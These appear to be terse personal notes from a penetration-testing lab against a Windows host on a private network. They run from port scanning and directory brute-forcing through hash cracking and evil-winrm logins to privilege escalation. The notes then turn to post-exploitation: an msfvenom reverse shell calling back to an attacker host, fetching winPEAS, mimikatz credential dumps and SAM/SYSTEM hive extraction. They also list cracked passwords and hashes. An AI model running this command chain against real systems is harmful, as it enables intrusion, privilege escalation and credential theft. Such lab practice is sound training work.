```
nmap 192.168.220.153 192.168.220.155-157
```

.153
```
nmap -sT -A -p 22,135,139,445,5040,5098,8000 192.168.220.153
nmap -p 1000-10000 192.168.220.153 # 5040, 5098 open
nmap -p 10000-60000 192.168.220.153 # 47001 open, 49664-49671 open
sudo nmap -O 192.168.220.153 --osscan-guess
sudo nmap -sU --open -p 161 192.168.220.153

# enumerate webserver
sudo nmap -sV -p 8000 --script "vuln" 192.168.220.153
nikto -host 192.168.220.153 -port 8000
whatweb http://192.168.220.153:8000
gobuster dir -u http://192.168.220.153:8000 -w /usr/share/wordlists/dirb/common.txt
feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.220.153:8000
feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.220.153:47001
gobuster dir -u http://192.168.220.153:8000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x jpg,jpeg,pdf,lnk,conf

# got some password hashes from /partner/DB
26231162520c611ccabfb18b5ae4dff2 - support:Freedom1
e7966b31d1cad8a83f12ecec236c384c - bcorp
df5fb539ff32f7fde5f3c05d8c8c1a6e - acorp
hashcat -m 0 ecorp.hash /usr/share/wordlists/rockyou.txt

# try password spraying - evilwinrm works
evil-winrm -i 192.168.220.153 -u support -p "Freedom1"
```

.153 privesc
```
iwr -uri http://192.168.45.234/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe

# cannot start/stop the admintool.exe or watch it
iwr -uri http://192.168.45.234/Watch-Command.ps1 -Outfile Watch-Command.ps1
Import-Module C:\Users\support\Watch-Command.ps1
Get-Process admintool -ErrorAction SilentlyContinue | Watch-Command -Difference -Continuous -Seconds 30

# try looking for files
Get-ChildItem -Path C:\ -Include *.ps1 -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.kdbx -File -Recurse -ErrorAction SilentlyContinue

x86_64-w64-mingw32-gcc adduser.c -o /home/kali/lab3/adduser.exe
upload adduser.exe
shutdown /r /t 0 
Get-LocalGroupMember administrators


msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.234 LPORT=9999 -f exe -o shell.exe

# obtain a has from running admintool.exe
# note that we needed an interactive shell to see the bug in the tool
# find this hash: d41d8cd98f00b204e9800998ecf8427e (turns out to be md5)
# password - December31
hashcat -m 0 admin.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

evil-winrm -i 192.168.220.153 -u Administrator -p "December31"
lsadump::sam sekurlsa::msv lsadump::secrets lsadump::cache

```

.153 post exploitation
```
evil-winrm -i 192.168.220.153 -u Administrator -p "December31"
# get a better shell
upload shell.exe
sekurlsa::logonpasswords
token::elevate
lsadump::sam 
lsadump::cache
lsadump::secrets

# mary.williams - 9a3121977ee93af56ebd0ef4f527a35e

# look for SAM files
%SYSTEMROOT%\repair\SAM  
%SYSTEMROOT%\System32\config\RegBack\SAM  
%SYSTEMROOT%\System32\config\SAM  
%SYSTEMROOT%\repair\system  
%SYSTEMROOT%\System32\config\SYSTEM  
%SYSTEMROOT%\System32\config\RegBack\system  

# found in %SYSTEMROOT%\System32\config\SAM  
cd C:\Windows\System32\config
download SAM
download SYSTEM
pypykatz registry --sam SAM SYSTEM
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL

```